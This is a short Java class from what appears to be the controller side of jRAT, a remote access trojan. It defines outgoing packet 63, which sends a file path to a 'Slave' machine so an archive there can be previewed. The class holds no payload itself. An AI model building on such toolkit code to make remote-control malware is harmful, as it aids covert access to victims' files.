package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet63PreviewArchive extends AbstractOutgoingPacket {

	private String file;

	public Packet63PreviewArchive(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public short getPacketId() {
		return 63;
	}

}
